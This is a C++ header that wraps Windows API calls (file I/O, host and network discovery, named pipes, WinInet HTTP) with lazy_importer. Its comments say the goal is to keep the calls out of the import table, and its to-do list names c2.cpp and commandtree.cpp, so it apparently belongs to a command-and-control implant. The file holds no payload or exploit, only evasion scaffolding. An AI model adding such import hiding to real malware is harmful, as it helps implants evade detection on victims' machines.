/*
What is this?

Goal: A wrapper around windows api funcs, that can be changed at will
This makes it super easy to just change your winapi call magic BS, but not change the core logic
of any winapi call throughout the program.

By default, I'm using lazy_importer to resolve functions for me. PLEASE feel free
to do your own logic, or just strip out lazy_importer and make the windows api calls normally


DOWNSIDES:
Every winapi function you need to use needs to be declared here.


Notes:
 - Using INLINE so a copy gets shoved into whereever you call WinApi::whatever, instead of referencing it a bajillion times
 Namespace lets us overwrite / use the same func names as the winapi

Also - a nice resource for finding what f*cking dll a function uses: https://malapi.io/

*/
#pragma once

#include "lazy_importer.hpp"

//for networking stuff, thank you windows
#include <winsock2.h>
#include <ws2tcpip.h>
#include <iphlpapi.h>
#include <netioapi.h>//NET_IF_STATUS
#include "_debug/debug.h"

//wininet
#include <wininet.h>

//* NO PRAGMA's, this includes all these funcs in the IAT. Use EnsureMOduleLoaded instead
//#pragma comment(lib, "iphlpapi.lib")
//#pragma comment(lib, "ws2_32.lib")

namespace WinApi {
    //makes sure a module is loaded into mem, otherwise we hit a crash cuz lazy_importer can't find it
    //note - ensuremoduleloaded makes it so we don't have to resolve via .in... cuz it's already in the PEB. 
    inline void EnsureModuleLoaded(LPCSTR moduleName) {
		DEBUG_LOG("[WinApi::EnsureModuleLoaded] Checking if module is loaded: " + std::string(moduleName));        
		//if we don't have the module....
        if (!LI_FN(GetModuleHandleA)(moduleName)) {
            //load it! :D
			DEBUG_LOG("[WinApi::EnsureModuleLoaded] Module not found. Calling LoadLibraryA on: " + std::string(moduleName));
            LI_FN(LoadLibraryA)(moduleName);
        }
        DEBUG_LOG("[WinApi::EnsureModuleLoaded] Already loaded!: " + std::string(moduleName));
    }

    // Wrapper for Sleep
    inline void Sleep(DWORD ms) {
        DEBUG_LOG("[WinApi::Sleep] Calling Sleep");
        //lazy imports:
        LI_FN(Sleep)(ms);

        //or if you want to call the regualr sleep for some reason,
        // use the :: to access it (tldr, :: makes c++ go find the OG func name iirc)
        //::Sleep(ms)
    }
    //MISC
    inline BOOL SetCurrentDirectoryW(LPCWSTR lpPathName) {
        DEBUG_LOG("[WinApi::SetCurrentDirectoryW] Calling SetCurrentDirectoryW");
        return LI_FN(SetCurrentDirectoryW)(lpPathName);
    }

    //FILES
    inline HANDLE CreateFileW(LPCWSTR lpFileName, DWORD dwDesiredAccess, DWORD dwShareMode, LPSECURITY_ATTRIBUTES lpSecurityAttributes, DWORD dwCreationDisposition, DWORD dwFlagsAndAttributes, HANDLE hTemplateFile) {
        DEBUG_LOG("[WinApi::CreateFileW] Calling CreateFileW");
        return LI_FN(CreateFileW)(lpFileName, dwDesiredAccess, dwShareMode, lpSecurityAttributes, dwCreationDisposition, dwFlagsAndAttributes, hTemplateFile);
    }

    inline BOOL GetFileSizeEx(HANDLE hFile, PLARGE_INTEGER lpFileSize) {
        DEBUG_LOG("[WinApi::GetFileSizeEx] Calling GetFileSizeEx");
        return LI_FN(GetFileSizeEx)(hFile, lpFileSize);
    }

    inline BOOL ReadFile(HANDLE hFile, LPVOID lpBuffer, DWORD nNumberOfBytesToRead, LPDWORD lpNumberOfBytesRead, LPOVERLAPPED lpOverlapped) {
        DEBUG_LOG("[WinApi::ReadFile] Calling ReadFile");
        return LI_FN(ReadFile)(hFile, lpBuffer, nNumberOfBytesToRead, lpNumberOfBytesRead, lpOverlapped);
    }

    inline BOOL WriteFile(HANDLE hFile, LPCVOID lpBuffer, DWORD nNumberOfBytesToWrite, LPDWORD lpNumberOfBytesWritten, LPOVERLAPPED lpOverlapped) {
        DEBUG_LOG("[WinApi::WriteFile] Calling WriteFile");
        return LI_FN(WriteFile)(hFile, lpBuffer, nNumberOfBytesToWrite, lpNumberOfBytesWritten, lpOverlapped);
    }

    //SYSTEM / UTILITY
    inline DWORD GetLastError() {
        DEBUG_LOG("[WinApi::GetLastError] Calling GetLastError");
        return LI_FN(GetLastError)();
    }

    // Metadata
    inline BOOL GetUserNameW(LPWSTR lpBuffer, LPDWORD pcbBuffer) {
        DEBUG_LOG("[WinApi::GetUserNameW] Calling GetUserNameW");
        //GetUserNameW needs advapi, make sure it exists
        EnsureModuleLoaded("advapi32.dll");
        return LI_FN(GetUserNameW)(lpBuffer, pcbBuffer);
    }

    inline BOOL GetComputerNameW(LPWSTR lpBuffer, LPDWORD lpnSize) {
        DEBUG_LOG("[WinApi::GetComputerNameW] Calling GetComputerNameW");
        return LI_FN(GetComputerNameW)(lpBuffer, lpnSize);
    }

    inline DWORD GetModuleFileNameW(HMODULE hModule, LPWSTR lpFilename, DWORD nSize) {
        DEBUG_LOG("[WinApi::GetModuleFileNameW] Calling GetModuleFileNameW");
        return LI_FN(GetModuleFileNameW)(hModule, lpFilename, nSize);
    }

    inline DWORD GetCurrentProcessId() {
        DEBUG_LOG("[WinApi::GetCurrentProcessId] Calling GetCurrentProcessId");
        return LI_FN(GetCurrentProcessId)();
    }

    // network stuff
    inline ULONG GetAdaptersAddresses(ULONG Family, ULONG Flags, PVOID Reserved, PIP_ADAPTER_ADDRESSES AdapterAddresses, PULONG SizePointer) {
        DEBUG_LOG("[WinApi::GetAdaptersAddresses] Calling GetAdaptersAddresses");
        EnsureModuleLoaded("Iphlpapi.dll");
        return LI_FN(GetAdaptersAddresses)(Family, Flags, Reserved, AdapterAddresses, SizePointer);
    }

    inline PCSTR inet_ntop(INT Family, const VOID* pAddr, PSTR pStringBuf, size_t StringBufSize) {
        DEBUG_LOG("[WinApi::inet_ntop] Calling inet_ntop");
        EnsureModuleLoaded("ws2_32.dll");
        return LI_FN(inet_ntop)(Family, pAddr, pStringBuf, StringBufSize);
    }


    //for discover

    inline DWORD GetIpNetTable2(ADDRESS_FAMILY Family, PMIB_IPNET_TABLE2* Table) {
        DEBUG_LOG("[WinApi::GetIpNetTable2] Calling GetIpNetTable2");
        EnsureModuleLoaded("Iphlpapi.dll");
        return LI_FN(GetIpNetTable2)(Family, Table);
    }

    inline VOID FreeMibTable(PVOID Memory) {
        DEBUG_LOG("[WinApi::FreeMibTable] Calling FreeMibTable");
        EnsureModuleLoaded("Iphlpapi.dll");
        LI_FN(FreeMibTable)(Memory);
    }

    // --- NETWORK FORMATTING & RESOLUTION ---

    inline PCWSTR InetNtopW(INT Family, const VOID* pAddr, PWSTR pStringBuf, size_t StringBufSize) {
        DEBUG_LOG("[WinApi::InetNtopW] Calling InetNtopW");
        EnsureModuleLoaded("Ws2_32.dll");
        return LI_FN(InetNtopW)(Family, pAddr, pStringBuf, StringBufSize);
    }

    inline INT GetNameInfoW(const SOCKADDR* pSockaddr, socklen_t SockaddrLength, PWSTR pNodeBuffer, DWORD NodeBufferSize, PWSTR pServiceBuffer, DWORD ServiceBufferSize, INT Flags) {
        DEBUG_LOG("[WinApi::GetNameInfoW] Calling GetNameInfoW");
        EnsureModuleLoaded("Ws2_32.dll");
        return LI_FN(GetNameInfoW)(pSockaddr, SockaddrLength, pNodeBuffer, NodeBufferSize, pServiceBuffer, ServiceBufferSize, Flags);
    }

    // misc
    inline DWORD FormatMessageA(DWORD dwFlags, LPCVOID lpSource, DWORD dwMessageId, DWORD dwLanguageId, LPSTR lpBuffer, DWORD nSize, va_list *Arguments) {
        DEBUG_LOG("[WinApi::FormatMessageA] Calling FormatMessageA");
        return LI_FN(FormatMessageA)(dwFlags, lpSource, dwMessageId, dwLanguageId, lpBuffer, nSize, Arguments);
    }

    inline HLOCAL LocalFree(HLOCAL hMem) {
        DEBUG_LOG("[WinApi::LocalFree] Calling LocalFree");
        return LI_FN(LocalFree)(hMem);
    }
    inline BOOL SetNamedPipeHandleState(HANDLE hNamedPipe, LPDWORD lpMode, LPDWORD lpMaxCollectionCount, LPDWORD lpCollectDataTimeout) {
        DEBUG_LOG("[WinApi::SetNamedPipeHandleState] Calling SetNamedPipeHandleState");
        return LI_FN(SetNamedPipeHandleState)(hNamedPipe, lpMode, lpMaxCollectionCount, lpCollectDataTimeout);
    }

    //https://learn.microsoft.com/en-us/windows/win32/api/namedpipeapi/nf-namedpipeapi-disconnectnamedpipe
    inline BOOL DisconnectNamedPipe(HANDLE hNamedPipe) {
        DEBUG_LOG("[WinApi::DisconnectNamedPipe] Calling DisconnectNamedPipe");
        return LI_FN(DisconnectNamedPipe)(hNamedPipe);
    }


    // --- Thread Pool API ---

    inline PTP_WORK CreateThreadpoolWork(PTP_WORK_CALLBACK pfnwk, PVOID pv, PTP_CALLBACK_ENVIRON pcbe) {
        DEBUG_LOG("[WinApi::CreateThreadpoolWork] Calling CreateThreadpoolWork");
        //return LI_FN(CreateThreadpoolWork)(pfnwk, pv, pcbe);
        //note - forwarding, crashes withouth forward. For now, just calling native func
        return ::CreateThreadpoolWork(pfnwk, pv, pcbe);

    }

    inline VOID SubmitThreadpoolWork(PTP_WORK pwk) {
        DEBUG_LOG("[WinApi::SubmitThreadpoolWork] Calling SubmitThreadpoolWork");
        //return LI_FN(SubmitThreadpoolWork)(pwk);
        // note - forwarding, crashes withouth forward. For now, just calling native func
        return ::SubmitThreadpoolWork(pwk);

    }

    inline VOID CloseThreadpoolWork(PTP_WORK pwk) {
        DEBUG_LOG("[WinApi::CloseThreadpoolWork] Calling CloseThreadpoolWork");
        //return LI_FN(CloseThreadpoolWork)(pwk);
        //  note - forwarding, crashes withouth forward. For now, just calling native func
        return ::CloseThreadpoolWork(pwk);

    }

    // --- Synchronization & Events ---

    inline HANDLE CreateEventW(LPSECURITY_ATTRIBUTES lpEventAttributes, BOOL bManualReset, BOOL bInitialState, LPCWSTR lpName) {
        DEBUG_LOG("[WinApi::CreateEventW] Calling CreateEventW");
        // note - forwarding, crashes withouth forward. For now, just calling native func
        //return LI_FN(CreateEventW)(lpEventAttributes, bManualReset, bInitialState, lpName);
        return ::CreateEventW(lpEventAttributes, bManualReset, bInitialState, lpName);
    }

    inline BOOL SetEvent(HANDLE hEvent) {
        DEBUG_LOG("[WinApi::SetEvent] Calling SetEvent");
        // note - forwarding, crashes withouth forward. For now, just calling native func
        //return LI_FN(SetEvent)(hEvent);
        return ::SetEvent(hEvent);
    }

    inline DWORD WaitForSingleObject(HANDLE hHandle, DWORD dwMilliseconds) {
        DEBUG_LOG("[WinApi::WaitForSingleObject] Calling WaitForSingleObject");
        // note - forwarding, crashes withouth forward. For now, just calling native func
        //return LI_FN(WaitForSingleObject)(hHandle, dwMilliseconds);
        return ::WaitForSingleObject(hHandle, dwMilliseconds);
    }

    inline DWORD WaitForMultipleObjects(DWORD nCount, const HANDLE *lpHandles, BOOL bWaitAll, DWORD dwMilliseconds) {
        DEBUG_LOG("[WinApi::WaitForMultipleObjects] Calling WaitForMultipleObjects");
        // note - forwarding, crashes withouth forward. For now, just calling native func
        //return LI_FN(WaitForMultipleObjects)(nCount, lpHandles, bWaitAll, dwMilliseconds);
        return ::WaitForMultipleObjects(nCount, lpHandles, bWaitAll, dwMilliseconds);
    }

    // --- Handle Management ---

    inline BOOL CloseHandle(HANDLE hObject) {
        DEBUG_LOG("[WinApi::CloseHandle] Calling CloseHandle");
        // note - forwarding, crashes withouth forward. For now, just calling native func
        //return LI_FN(CloseHandle)(hObject);
        return ::CloseHandle(hObject);
    }
    inline HANDLE CreateThread(LPSECURITY_ATTRIBUTES lpThreadAttributes, SIZE_T dwStackSize, LPTHREAD_START_ROUTINE lpStartAddress, LPVOID lpParameter, DWORD dwCreationFlags, LPDWORD lpThreadId) {
        DEBUG_LOG("[WinApi::CreateThread] Calling CreateThread");
        return LI_FN(CreateThread)(lpThreadAttributes, dwStackSize, lpStartAddress, lpParameter, dwCreationFlags, lpThreadId);
    }

    //WINIET:
    // --- WinInet Initialization & Connection ---

    inline HINTERNET InternetOpenW(LPCWSTR lpszAgent, DWORD dwAccessType, LPCWSTR lpszProxy, LPCWSTR lpszProxyBypass, DWORD dwFlags) {
        DEBUG_LOG("[WinApi::InternetOpenW] Calling InternetOpenW");
        EnsureModuleLoaded("wininet.dll");
        return LI_FN(InternetOpenW)(lpszAgent, dwAccessType, lpszProxy, lpszProxyBypass, dwFlags);
    }

    inline HINTERNET InternetConnectW(HINTERNET hInternet, LPCWSTR lpszServerName, INTERNET_PORT nServerPort, LPCWSTR lpszUserName, LPCWSTR lpszPassword, DWORD dwService, DWORD dwFlags, DWORD_PTR dwContext) {
        DEBUG_LOG("[WinApi::InternetConnectW] Calling InternetConnectW");
        EnsureModuleLoaded("wininet.dll");
        return LI_FN(InternetConnectW)(hInternet, lpszServerName, nServerPort, lpszUserName, lpszPassword, dwService, dwFlags, dwContext);
    }

    // --- HTTP Request Management ---

    inline HINTERNET HttpOpenRequestW(HINTERNET hConnect, LPCWSTR lpszVerb, LPCWSTR lpszObjectName, LPCWSTR lpszVersion, LPCWSTR lpszReferrer, LPCWSTR *lplpszAcceptTypes, DWORD dwFlags, DWORD_PTR dwContext) {
        DEBUG_LOG("[WinApi::HttpOpenRequestW] Calling HttpOpenRequestW");
        EnsureModuleLoaded("wininet.dll");
        return LI_FN(HttpOpenRequestW)(hConnect, lpszVerb, lpszObjectName, lpszVersion, lpszReferrer, lplpszAcceptTypes, dwFlags, dwContext);
    }

    inline BOOL HttpAddRequestHeadersW(HINTERNET hRequest, LPCWSTR lpszHeaders, DWORD dwHeadersLength, DWORD dwModifiers) {
        DEBUG_LOG("[WinApi::HttpAddRequestHeadersW] Calling HttpAddRequestHeadersW");
        EnsureModuleLoaded("wininet.dll");
        return LI_FN(HttpAddRequestHeadersW)(hRequest, lpszHeaders, dwHeadersLength, dwModifiers);
    }

    inline BOOL HttpSendRequestW(HINTERNET hRequest, LPCWSTR lpszHeaders, DWORD dwHeadersLength, LPVOID lpOptional, DWORD dwOptionalLength) {
        DEBUG_LOG("[WinApi::HttpSendRequestW] Calling HttpSendRequestW");
        EnsureModuleLoaded("wininet.dll");
        return LI_FN(HttpSendRequestW)(hRequest, lpszHeaders, dwHeadersLength, lpOptional, dwOptionalLength);
    }

    // --- Data Retrieval & Cleanup ---

    inline BOOL InternetReadFile(HINTERNET hFile, LPVOID lpBuffer, DWORD dwNumberOfBytesToRead, LPDWORD lpdwNumberOfBytesRead) {
        DEBUG_LOG("[WinApi::InternetReadFile] Calling InternetReadFile");
        EnsureModuleLoaded("wininet.dll");
        return LI_FN(InternetReadFile)(hFile, lpBuffer, dwNumberOfBytesToRead, lpdwNumberOfBytesRead);
    }

    inline BOOL InternetCloseHandle(HINTERNET hInternet) {
        DEBUG_LOG("[WinApi::InternetCloseHandle] Calling InternetCloseHandle");
        EnsureModuleLoaded("wininet.dll");
        return LI_FN(InternetCloseHandle)(hInternet);
    }

    inline HANDLE CreateNamedPipeW(LPCWSTR lpName, DWORD dwOpenMode, DWORD dwPipeMode, DWORD nMaxInstances, DWORD nOutBufferSize, DWORD nInBufferSize, DWORD nDefaultTimeOut, LPSECURITY_ATTRIBUTES lpSecurityAttributes) {
        DEBUG_LOG("[WinApi::CreateNamedPipeW] Calling CreateNamedPipeW");
        return LI_FN(CreateNamedPipeW)(lpName, dwOpenMode, dwPipeMode, nMaxInstances, nOutBufferSize, nInBufferSize, nDefaultTimeOut, lpSecurityAttributes);
    }

    inline BOOL ConnectNamedPipe(HANDLE hNamedPipe, LPOVERLAPPED lpOverlapped) {
        DEBUG_LOG("[WinApi::ConnectNamedPipe] Calling ConnectNamedPipe");
        return LI_FN(ConnectNamedPipe)(hNamedPipe, lpOverlapped);
    }

    //https://learn.microsoft.com/en-us/windows/win32/api/namedpipeapi/nf-namedpipeapi-waitnamedpipew
    inline BOOL WaitNamedPipeW(LPCWSTR lpNamedPipeName, DWORD nTimeOut) {
        DEBUG_LOG("[WinApi::WaitNamedPipeW] Calling WaitNamedPipeW");
        return LI_FN(WaitNamedPipeW)(lpNamedPipeName, nTimeOut);
    }


    //modules to do/check:
    //[X]ls
    //[X] strategy
    //[ ] discover
    //the rest of the project
    //[X] c2.cpp
    //[x]commandtree.cpp
    //wininiet/http.cpp


    //// Wrapper for networking with encrypted strings
    //inline HANDLE HttpOpen(LPCSTR agent) {
    //    // skCrypt ensures the agent string is encrypted
    //    return LI_FN(HttpOpenA)(skCrypt(agent), ...);
    //}
}